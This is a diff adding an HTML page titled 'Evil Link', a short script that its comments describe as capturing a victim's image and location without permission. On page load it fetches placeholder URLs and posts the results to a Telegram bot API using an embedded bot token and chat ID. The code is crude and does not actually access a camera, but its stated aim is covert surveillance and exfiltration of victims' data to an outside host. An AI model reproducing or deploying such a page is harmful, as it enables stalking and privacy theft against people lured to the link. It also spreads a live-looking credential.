@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Evil Link</title>
+</head>
+<body>
+    <script>
+        // Capture victim's image
+        let victimImage = new Image();
+        victimImage.src = "https://link-to-capture-victim-image.com";
+        
+        // Get victim's location without their permission
+        fetch("https://link-to-capture-victim-location.com")
+            .then(response => response.text())
+            .then(data => {
+                console.log(data);
+                // Send captured image and location to Telegram
+                fetch("https://api.telegram.org/bot7120302989:AAG4ztzubzgfscIJl6BnmsK2QiuVRhFpdFQ/sendPhoto", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        chat_id: "6842468827",
+                        photo: victimImage.src,
+                        caption: data
+                    }),
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                });
+            });
+    </script>
+</body>
+</html>
